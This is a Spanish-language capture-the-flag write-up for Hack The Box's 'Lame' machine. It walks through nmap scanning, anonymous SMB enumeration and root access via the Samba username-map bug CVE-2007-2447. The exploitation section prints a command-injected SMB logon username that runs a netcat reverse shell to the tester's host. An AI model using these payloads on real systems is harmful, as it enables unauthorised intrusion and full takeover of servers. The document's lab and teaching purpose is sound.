---
title: Lame - Easy (HTB)
permalink: /Lame-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "SMB"
  - "CVE-2007-24471"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Lame - Easy (HTB)
seo_description: Aprende a identificar y explotar vulnerabilidades conocidas en versiones antiguas de servicios para vencer Lame.
excerpt: Aprende a identificar y explotar vulnerabilidades conocidas en versiones antiguas de servicios para vencer Lame.
header:
  overlay_image: /assets/images/headers/lame-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/lame-hackthebox.jpg
---


![image-center](/assets/images/posts/lame-hackthebox.png)
{: .align-center}

**Habilidades:** Samba 3.0.20 < 3.0.25rc3 `username map` Command Execution - CVE-2007-2447 
{: .notice--primary}

# Introducción

Lame es una máquina de dificultad `Easy` en HackTheBox donde aprenderemos acerca de detección de vulnerabilidades en base a versiones antiguas de un servicio. Esta máquina es ideal para quienes se inicien en explotación de vulnerabilidades

<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.10.3  
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 142.022/142.022/142.022/0.000 ms
~~~


## Nmap Scanning 

Iniciaremos el reconocimiento con un escaneo de todos los puertos en la máquina víctima, con el fin de detectar puertos que estén abiertos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.3 -oG openPorts                                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 14:43 EDT
Nmap scan report for 10.10.10.3
Host is up (0.14s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo más exhaustivo a estos puertos abiertos, el propósito ahora será descubrir versiones de los servicios que se ejecutan

~~~ bash
nmap -p 21,22,139,445,3632 -sVC 10.10.10.3 -oN services                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 14:44 EDT
Nmap scan report for 10.10.10.3
Host is up (0.21s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.140
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-11T14:45:38-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m25s, deviation: 2h49m44s, median: 23s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.97 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## (Posible) SMB Enumeration

Como el servicio SMB se encuentra expuesto, intentaremos conectarnos sin credenciales para listar los recursos disponibles

~~~ bash
smbclient //10.10.10.3/ -U "" -N
~~~

Una gran alternativa es usar la herramienta `smbmap` que nos muestra los permisos de los que disponemos para cada recurso

~~~ bash
smbmap -H 10.10.10.3 -u '' -p ''
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
~~~

Podemos acceder a un recurso llamado `tmp` con capacidad de lectura y escritura, nos conectaremos con `smbclient`

~~~ bash
smbclient //10.10.10.3/tmp

Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr 16 15:36:06 2025
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  kdhy                                N        0  Wed Apr 16 11:39:40 2025
  .ICE-unix                          DH        0  Wed Apr 16 10:43:33 2025
  vmware-root                        DR        0  Wed Apr 16 10:44:30 2025
  hldppda                             N        0  Wed Apr 16 15:36:05 2025
  .X11-unix                          DH        0  Wed Apr 16 10:43:59 2025
  juzahu                              N        0  Wed Apr 16 12:31:14 2025
  .X0-lock                           HR       11  Wed Apr 16 10:43:59 2025
  5541.jsvc_up                        R        0  Wed Apr 16 10:44:36 2025
  vgauthsvclog.txt.0                  R     1600  Wed Apr 16 10:43:31 2025

		7282168 blocks of size 1024. 5386392 blocks available
~~~

Investigando estos archivos, no nos darán información relevante para una explotación
<br>


# Intrusión / Explotación
---
## Samba 3.0.20 < 3.0.25rc3 /`username map` Command Execution - CVE 2007-2447

Esta vulnerabilidad nos permite ejecutar comandos mediante un nombre de usuario malicioso, debido a la falta de sanitización en este parámetro

- https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

El payload dentro del anterior exploit utiliza el comando `logon` dentro de una sesión SMB abierta. Esto nos permite ejecutar un comando utilizando el comando encapsulado

~~~ bash
smb: \> logon "/=`nohup ping -c1 10.10.14.212`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
~~~

Antes de ejecutar esta prueba de Concepto, nos pondremos a la escucha de paquetes ICMP para verificar que recibamos la traza

~~~ bash
tcpdump -i tun0 icmp  

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:11:30.274971 IP 10.10.10.3 > 10.10.14.212: ICMP echo request, id 10011, seq 1, length 64
15:11:30.274992 IP 10.10.14.212 > 10.10.10.3: ICMP echo reply, id 10011, seq 1, length 64
~~~

Vemos que hemos recibido un ping hacia nuestra máquina desde la IP de la máquina víctima. Ahora podemos intentar enviarnos una shell a nuestra máquina. Pondremos un puerto a la escucha para recibir la conexión

~~~ bash
nc -lvnp 443
~~~

Iniciaremos la conexión por `smb`, y al momento de conectarnos intentaremos iniciar una sesión con un usuario malicioso, que nos enviará una reverse shell con `netcat`

~~~ bash
smbclient //10.10.10.3/tmp
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "=/ `nohup nc 10.10.14.212 443 -e /bin/bash`"
Password: 
~~~
<br>


# Escalada de Privilegios
---
Pues como ya ganamos acceso a la máquina como `root`, no habría más que hacer que un tratamiento de la TTY para operar de una forma más cómoda

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.212] from (UNKNOWN) [10.10.10.3] 54217
script /dev/null -c bash
root@lame:/# ^Z
[1]  + 56568 suspended  nc -lvnp 443
root@parrot lame # stty raw -echo;fg         
[1]  + 56568 continued  nc -lvnp 443
									reset xterm # No se verá

root@lame:/# cd /root 
root@lame:/# cat root.txt
root@lame:/# cd home 
root@lame:/# ls
ftp  makis  service  user
root@lame:/home# cd makis
root@lame:/home/makis# cat user.txt
~~~

Por último te dejo la frase del día, muchas gracias por ver...

> Ability will never catch up with the demand for it.
> — Confucius
{: .notice--info}

